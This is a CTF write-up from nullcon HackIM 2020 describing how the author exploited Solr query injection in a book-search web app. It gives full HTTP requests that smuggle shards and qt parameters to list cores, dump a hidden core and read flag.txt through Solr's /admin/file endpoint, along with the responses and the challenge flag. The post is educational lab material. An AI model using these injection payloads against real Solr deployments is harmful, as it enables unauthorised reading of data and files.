---
title: "nullcon HackIM 2020 - Solar Energy"
date: 2020-02-17T23:10:00+01:00
showDate: true
draft: false
tags: ["ctf","web","solr","query","injection"]
---

solar-energy
============
> ```TLDR; Solr query injection, which lead to file read.```

On the previous weekend I played nullcon HackIM 2020 CTF. In the end our team managed to take 2nd place. There was couple of interesting challenges and one of them was challenge involving **Apache Solr**, software which I don't have too much expirience with. I heavily used Burp and Hackvertor extension, that helped me with URL encoding (these '`<@urlencode>`' tags in the requests).

On the main page of the challenge there was simple application that allowed you search for a book by entering some phrase. There was only one simple HTML form with one input field, so pretty straightforward.

After a little bit of poking around with the input we managed to crash app:

```http
GET /search.php?search=book" HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8080/
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Mon, 10 Feb 2020 14:14:05 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.1.8
Content-Length: 281
Connection: close
Content-Type: application/json
    
{"error":{"metadata":["error-class","org.apache.solr.common.SolrException","root-error-class","org.apache.solr.parser.TokenMgrError"],"msg":"org.apache.solr.search.SyntaxError: Cannot parse 'book\"': Lexical error at line 1, column 6.  Encountered: <EOF> after : \"\"","code":400}}
```

After that we knew what we are dealing with since the error was pretty verbose. The first thing I googled was `Solr injection`. Googling lead me to [this github repo](https://github.com/veracode-research/solr-injection). It basicly contains description and payloads for `Solr query injection` vulnerability. I tested most of them, but none seemd to work. However we were sure that we can inject something, because of the error we've got eariler.  

Application is vulnerable to Solr query injection when frontend application is issuing HTTP request to Solr API **without** url encoding query value. This allows the user for passing more that just one parameter in the request to the Solr backend.  

After couple more hours and dozens of Solr documentation pages later we managed to list all the cores, which are basicly the same thing what indexes are in Elastic Search or a database is in traditional, relational database.

```http
GET /search.php?search=<@urlencode_9>search=book&shards=localhost%3a8983/&qt=/solr/admin/cores%3faction%3dSTATUS%26wt%3djson<@/urlencode_9> HTTP/1.1
Host: web3.ctf.nullcon.net:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web3.ctf.nullcon.net:8080/
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Mon, 10 Feb 2020 14:38:22 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.1.8
Content-Length: 2792
Connection: close
Content-Type: application/json
    
<JUNK>    
  \"SeCrEtSeArCh8888\":{\n      \"name\":\"SeCrEtSeArCh8888\",\n      \"instanceDir\":\"\/var\/solr\/data\/SeCrEtSeArCh8888\",\n      \"dataDir\":\"\/var\/solr\/data\/SeCrEtSeArCh8888\/data\/\",\n      \"config\":\"solrconfig.xml\",\n      \"schema\":\"managed-schema\",\n   
<JUNK>    
  \"hackimsearch\":{\n      \"name\":\"hackimsearch\",\n      \"instanceDir\":\"\/var\/solr\/data\/hackimsearch\",\n      \"dataDir\":\"\/var\/solr\/data\/hackimsearch\/data\/\",\n      \"config\":\"solrconfig.xml\",\n      \"schema\":\"managed-schema\",\n 
<JUNK>    
```

In the request we injected two additional Solr request parameters, **shards** and **qt**. Both of them combined allowed for rewriting the request URL. Important thing is that the values of these parameters had to be double url encoded, since they will be decoded and passed to another HTTP request. Another thing to notice is that we had to smuggle another two paramters in **qt** parameter, which were **action** and **wt**. First one is responsible for choosing what action you wanna take and the second one for the response format (if we would pass `json` value we would simply get `500 java.lang.NullPointerException`).  

There were two cores, `hackimsearch`, which contained all the data about books, and the second one called `SeCrEtSeArCh8888`. We listed secret core's documents hoping that there will be a flag somewhere:

```http
GET /search.php?search=<@urlencode_all_8>book&shards=localhost%3a8983/&qt=/solr/SeCrEtSeArCh8888/query%3fq%3d*<@/urlencode_all_8> HTTP/1.1
Host: web3.ctf.nullcon.net:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web3.ctf.nullcon.net:8080/
Connection: close
```
```http
HTTP/1.1 200 OK
Date: Mon, 10 Feb 2020 15:17:27 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.1.8
Content-Length: 186
Connection: close
Content-Type: application/json
    
{"response":{"numFound":1,"start":0,"maxScore":1,"docs":[{"id":"secret","flag":["Great job but flag is not here. Maybe you should hit the filesystem"],"_version_":1658146505195782144}]}}    
```

Unfortunately, not quite there yet. But we knew we were close and what we needed to do next.
After another round of going through the documentation, one thing caught my attention. It was API endpoint `/admin/file`. Issuing request with just **wt** parameter, allowned us for listing of all the files within core's working directory:

```http
GET /search.php?search=<@urlencode_all_8>book&shards=localhost:8983/&qt=/solr/SeCrEtSeArCh8888/admin/file%3fwt%3djson&debug=all<@/urlencode_all_8> HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web3.ctf.nullcon.net:8080/
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Mon, 10 Feb 2020 15:27:45 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.1.8
Content-Length: 1077
Connection: close
Content-Type: application/json
    
{"error":{"metadata":["error-class","org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException","root-error-class","org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException"],"msg":"Error from server at null: Expected mime type application\/octet-stream but got text\/plain. {\n  \"responseHeader\":{\n    \"status\":0,\n    \"QTime\":0},\n  \"files\":{\n    \"protwords.txt\":{\n      \"size\":873,\n      \"modified\":\"2020-02-10T10:42:36.990Z\"},\n    \"lang\":{\n      \"directory\":true,\n      \"modified\":\"2020-02-10T10:42:36.990Z\"},\n    \"solrconfig.xml\":{\n      \"size\":49058,\n      \"modified\":\"2020-02-10T10:42:36.990Z\"},\n    \"flag.txt\":{\n      \"size\":50,\n      \"modified\":\"2020-02-10T10:48:37.946Z\"},\n    \"managed-schema\":{\n      \"size\":30770,\n      \"modified\":\"2020-02-10T10:42:54.026Z\"},\n    \"stopwords.txt\":{\n      \"size\":781,\n      \"modified\":\"2020-02-10T10:42:36.990Z\"},\n    \"synonyms.txt\":{\n      \"size\":1124,\n      \"modified\":\"2020-02-10T10:42:36.990Z\"}}}\n","code":200}}    
```
More readable output:
```json
    "protwords.txt":{
     "size":873,
     "modified":"2020-02-10T10:42:36.990Z"},
    "lang":{
     "directory":true,
     "modified":"2020-02-10T10:42:36.990Z"},
    "solrconfig.xml":{
     "size":49058,
     "modified":"2020-02-10T10:42:36.990Z"},
    "flag.txt":{
     "size":50,
     "modified":"2020-02-10T10:48:37.946Z"},
    "managed-schema":{
     "size":30770,
     "modified":"2020-02-10T10:42:54.026Z"},
    "stopwords.txt":{
     "size":781,
     "modified":"2020-02-10T10:42:36.990Z"},
    "synonyms.txt":{
     "size":1124,
     "modified":"2020-02-10T10:42:36.990Z"}
```

So, there it was, `flag.txt`. Now we only need to read it. Luckly I was able to pretty quickly find additional parameters, that, despite content type, read the file:

```http
GET /search.php?search=<@urlencode_all_8>book&shards=localhost%3a8983/&qt=/solr/SeCrEtSeArCh8888/admin/file%3fwt%3djson%26file%3dflag.txt%26contentType%3dtext/plain<@/urlencode_all_8> HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web3.ctf.nullcon.net:8080/
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Mon, 10 Feb 2020 15:37:28 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.1.8
Content-Length: 371
Connection: close
Content-Type: application/json
    
{"error":{"metadata":["error-class","org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException","root-error-class","org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException"],"msg":"Error from server at null: Expected mime type application\/octet-stream but got text\/plain. hackim20{Content_Mismatch_helps_you_all_the_Time}\n","code":200}}    
```

```
hackim20{Content_Mismatch_helps_you_all_the_Time}
```
